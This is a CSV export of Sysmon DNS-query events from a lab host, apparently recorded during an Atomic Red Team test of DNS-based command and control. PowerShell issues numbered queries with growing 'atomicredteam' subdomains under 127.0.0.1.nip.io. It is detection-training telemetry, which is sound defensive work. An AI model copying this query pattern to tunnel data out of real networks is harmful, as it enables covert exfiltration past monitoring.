"2025-12-22 14:01:21.326 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166368,"Query: 038.atomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:20.512","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:21.326 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166369,"Query: 039.atomicredtea.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:20.836","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:21.326 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166370,"Query: 040.atomicredteam.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:20.880","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:21.326 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166371,"Query: 041.atomicredteama.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:20.924","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:21.326 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166372,"Query: 042.atomicredteamat.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:21.104","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:21.326 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166373,"Query: 043.atomicredteamato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:21.144","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:21.326 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166374,"Query: 044.atomicredteamatom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:21.186","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:21.326 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166375,"Query: 045.atomicredteamatomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:21.240","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:21.326 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166376,"Query: 046.atomicredteamatomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:21.281","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:22.333 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166377,"Query: 047.atomicredteamatomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:21.322","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:22.333 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166378,"Query: 048.atomicredteamatomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:21.642","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:22.333 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166379,"Query: 049.atomicredteamatomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:21.684","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:22.333 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166380,"Query: 050.atomicredteamatomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:21.726","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:22.333 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166381,"Query: 051.atomicredteamatomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.043","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:22.333 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166382,"Query: 052.atomicredteamatomicredtea.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.084","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:22.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166383,"Query: 053.atomicredteamatomicredteam.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.258","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:22.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166384,"Query: 054.atomicredteamatomicredteama.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.300","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:23.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166385,"Query: 055.atomicredteamatomicredteamat.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.345","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:23.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166386,"Query: 056.atomicredteamatomicredteamato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.391","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:23.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166387,"Query: 057.atomicredteamatomicredteamatom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.562","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:23.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166388,"Query: 058.atomicredteamatomicredteamatomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.604","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:23.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166389,"Query: 059.atomicredteamatomicredteamatomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.647","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:23.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166390,"Query: 060.atomicredteamatomicredteamatomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.690","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:23.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166391,"Query: 061.atomicredteamatomicredteamatomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.734","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:23.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166392,"Query: 062.atomicredteamatomicredteamatomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:22.778","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:23.334 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166393,"Query: 063.atomicredteamatomicredteamatomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:23.097","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.338 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166394,"Query: 064.atomicredteamatomicredteamatomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:23.418","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.338 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166395,"Query: 065.atomicredteamatomicredteamatomicredtea.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:23.462","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.338 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166396,"Query: 066.atomicredteamatomicredteamatomicredteam.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:23.505","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.338 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166397,"Query: 067.atomicredteamatomicredteamatomicredteama.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:23.549","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.339 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166398,"Query: 068.atomicredteamatomicredteamatomicredteamat.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:23.722","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.339 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166399,"Query: 069.atomicredteamatomicredteamatomicredteamato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:23.770","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.339 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166400,"Query: 070.atomicredteamatomicredteamatomicredteamatom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:23.941","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.339 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166401,"Query: 071.atomicredteamatomicredteamatomicredteamatomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:23.985","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.339 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166402,"Query: 072.atomicredteamatomicredteamatomicredteamatomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.026","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.339 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166403,"Query: 073.atomicredteamatomicredteamatomicredteamatomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.069","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.339 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166404,"Query: 074.atomicredteamatomicredteamatomicredteamatomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.109","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.339 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166405,"Query: 075.atomicredteamatomicredteamatomicredteamatomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.154","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.339 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166406,"Query: 076.atomicredteamatomicredteamatomicredteamatomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.195","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:24.340 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166407,"Query: 077.atomicredteamatomicredteamatomicredteamatomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.236","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166408,"Query: 078.atomicredteamatomicredteamatomicredteamatomicredtea.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.278","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166409,"Query: 079.atomicredteamatomicredteamatomicredteamatomicredteam.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.600","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166410,"Query: 080.atomicredteamatomicredteamatomicredteamatomicredteama.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.775","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166411,"Query: 081.atomicredteamatomicredteamatomicredteamatomicredteamat.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.817","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166412,"Query: 082.atomicredteamatomicredteamatomicredteamatomicredteamato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.860","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166413,"Query: 083.atomicredteamatomicredteamatomicredteamatomicredteamatom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.904","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
